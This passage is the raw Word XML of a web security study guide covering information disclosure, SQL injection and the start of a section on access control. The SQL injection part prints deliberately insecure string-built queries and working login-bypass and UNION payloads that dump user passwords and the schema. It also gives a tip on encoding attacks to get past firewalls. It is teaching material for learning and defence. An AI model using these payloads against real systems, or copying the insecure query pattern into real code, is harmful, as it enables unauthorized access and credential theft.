    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Insecure build pipeline or web server configuration</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Version control history</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ensure all members of the service team know what information is and isn't considered sensitive so that it can be treated </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>consistenly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Keep error messages generic and devoid of technical details.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Disable stack trace and log output to the user in production.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Audit code and build logs for sensitive information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Ensure production services have a secure configuration that strips as mush ide</w:t>
      </w:r>
      <w:r>
        <w:t>ntifying information as possible from the responses (e.g. response header fingerprinting).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Intruder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Scanner</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/information-disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/information-disclosure/exploiting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">SQL </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>injection :syringe</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Allows an attacker to interfere with, and alter, SQL queries being </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">performed by the app.  Relies on string concatenation from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>unsanitized</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> user input directly into the SQL query.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>The attack can come in various forms:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Immediate bypass of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Information disclosure using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>UNION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> queries.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Stored SQL injection.  This </w:t>
      </w:r>
      <w:r>
        <w:t>is where the attacker can inject SQL into the database, and have it executed later.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Simple to prevent in an app by using parameterized queries and never allowing dynamic query construction.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodepython"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>with</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>db_connection.cursor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(prepared=True) as cursor:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stmt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "INSERT INTO notes (note, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>owner_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) VALUES (%s, %s)"</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cursor.execute</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stmt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, (note, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>owner_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>))</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Examples</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Bypass WHERE clause</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodepython"/>
      </w:pPr>
      <w:r>
        <w:t># Insecure query</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>query</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f"SELECT</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> username FROM users WHERE username = '{username}' AND password = '{password}'"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># If u</w:t>
      </w:r>
      <w:r>
        <w:t>sername is passed as either of the following, attack will succeed as the password check is</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># bypassed by the SQL comment `--`.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>username</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "admin'--"</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>username = "admin' OR 1=1--"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Information disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="FencedCodepython"/>
      </w:pPr>
      <w:r>
        <w:t># Insecure query</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>query</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f"SELECT</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>product_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> FROM pro</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ducts WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>product_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>product_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Retrieve all users and passwords</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve"># The UNION query concatenates multiple columns </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>togehter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> into a single column</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># as only one column is being returned by the original query</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>product_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "1 UNION SELECT CONCAT(`usern</w:t>
      </w:r>
      <w:r>
        <w:t>ame`, ' ', `password`) FROM users--"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># View database schema</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>product_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "1 UNION SELECT CONCAT(`</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>table_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>`, ' ', `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>column_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">`) FROM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>information_schema.columns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>--"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Test</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Bu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rp Proxy</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> to intercept requests and send them to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Repeater</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Alter the request payloads and observe the response.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Tips</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If requests are being blocked, try encoding the attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> using a tool like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Hackvertor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.  Firewalls can sometimes be circumvented by hex and decimal encoding, which the application will decode and execute.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>BApp</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> Store &gt; </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Hackvertor</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/sql-injection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Acc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>control :</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>_badge</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">The authentication and authorization of a user (or service) to an application.  Dictates who can </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>acccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and what they can do.  Includes:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Authentication</w:t>
      </w:r>
      <w:r>
        <w:t>: identifies the user or service (who is this?)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Session management</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: identifies </w:t>
      </w:r>
      <w:r>
        <w:t>subsequent requests from the same user or service (persist the authentication)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Access control (authorization)</w:t>
      </w:r>
      <w:r>
        <w:t>: determines what the user or service can access and actions they can perform (what can they do?)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Access control is business logic that is determin</w:t>
      </w:r>
      <w:r>
        <w:t>ed by humans and enforced by the code.  Potential for errors and serious breaches are high.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Types</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Vertical access control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Allow access to resources based on the role of the user (an administrator can access the admin panel).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Vertical </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>privelege</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> escalation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>When a user is able to gain access to a role or user they should not have access to.  A simple example is gaining access to the admin panel.  Types are:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Unprotected functionality</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: insufficient access control on a resource and relies on that resource being </w:t>
      </w:r>
      <w:r>
        <w:t>hidden (e.g. admin panel does not check if the request is for an authenticated administrator).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Parameter based access control</w:t>
      </w:r>
      <w:r>
        <w:t>: when a user is able to provide a parameter that escalates their privileges (e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
